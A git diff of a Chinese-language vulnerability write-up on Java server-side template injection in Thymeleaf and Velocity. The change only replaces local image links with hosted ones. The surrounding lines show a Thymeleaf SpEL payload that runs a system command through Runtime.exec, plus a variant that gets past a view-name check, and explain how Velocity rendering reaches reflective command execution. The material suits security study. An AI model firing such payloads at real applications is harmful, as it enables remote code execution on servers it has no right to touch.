@@ -91,7 +91,8 @@ __${T%20(java.lang.Runtime).getRuntime().exec("calc")}__::.x
 
 还需要说明一点。当 path 和返回的视图名⼀样的时候，需要使用**如下poc**
 
-![image-20211123124638080](img/image-20211123124638080.png)
+![image](https://user-images.githubusercontent.com/63966847/143764895-5ea0f3b0-c89f-4f87-9974-a254365106a8.png)
+
 
 ```java
 ;/__${T%20(java.lang.runtime).getruntime().exec("calc")}__::.x
@@ -100,7 +101,7 @@ __${T%20(java.lang.Runtime).getRuntime().exec("calc")}__::.x
 
 原因说下图，在进行**parseExpression**之前做了一个**checkViewNameNotInRequest**操作
 
-![image-20211123000937744](img/image-20211123000937744.png)
+![image](https://user-images.githubusercontent.com/63966847/143764903-587e5808-3533-4aee-975f-d61135ed315b.png)
 
 
 
@@ -221,15 +222,15 @@ run:748, Thread (java.lang)
 
 在调用template#merge的时候渲染触发org.apache.velocity.runtime.parser.node.SimpleNode#render对其他节点进行渲染
 
-![image-20211124182047861](img/image-20211124182047861.png)
+![image](https://user-images.githubusercontent.com/63966847/143764912-04aa195c-a3fa-49d1-8689-9ffdb568883a.png)
 
 之后触发org.apache.velocity.runtime.parser.node.ASTReference#render
 
-![image-20211124182308303](img/image-20211124182308303.png)
+![image](https://user-images.githubusercontent.com/63966847/143764917-7c8e1420-b40b-49d5-bbc5-24c35ca2b1f2.png)
 
 触发execute方法，之后通过反射去执行命令
 
-![image-20211124182411674](img/image-20211124182411674.png)
+![image](https://user-images.githubusercontent.com/63966847/143764918-1b6d2be5-64ae-400a-99b0-4dca7317ec2b.png)
 
 exp
 
